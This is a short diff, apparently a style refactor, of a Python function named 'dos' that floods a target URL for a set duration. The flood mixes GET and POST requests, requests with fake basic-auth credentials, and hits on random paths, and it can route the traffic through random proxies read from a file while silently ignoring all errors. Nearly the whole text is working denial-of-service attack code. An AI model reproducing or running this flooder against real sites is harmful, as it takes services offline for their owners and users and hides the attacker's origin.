@@ -78,18 +78,19 @@ def dos(url, tm, prx):
 	if prx == 'yes':
 		proxy = []
 		with open(r"proxies.txt", "r", encoding="utf-8") as file:
-			for line in file:
-				proxy.append(line)
-
+			proxy.extend(iter(file))
 		proxy = [line.rstrip() for line in proxy]
 		while time.monotonic() - t <= tm:
 			try:
-				proxies = {'http': 'http://' + random.choice(proxy), 'https': 'http://' + random.choice(proxy)}
+				proxies = {
+				    'http': f'http://{random.choice(proxy)}',
+				    'https': 'http://' + random.choice(proxy),
+				}
 				requests.get(url, proxies = proxies)
 				requests.post(url, headers = header, json = payload, proxies = proxies)
 				requests.get(url, auth=('username', 'fakepass'), proxies = proxies)
-				requests.get(url + '/' + random.choice(lib), proxies = proxies)
-			
+				requests.get(f'{url}/{random.choice(lib)}', proxies = proxies)
+
 			except:
 				pass
 	else:
@@ -98,7 +99,7 @@ def dos(url, tm, prx):
 				requests.get(url, proxies = proxies)
 				requests.post(url, headers = header, json = payload)
 				requests.get(url, auth=('username', 'fakepass'))
-				requests.get(url + '/' + random.choice(lib))
-			
+				requests.get(f'{url}/{random.choice(lib)}')
+
 			except:
 				pass
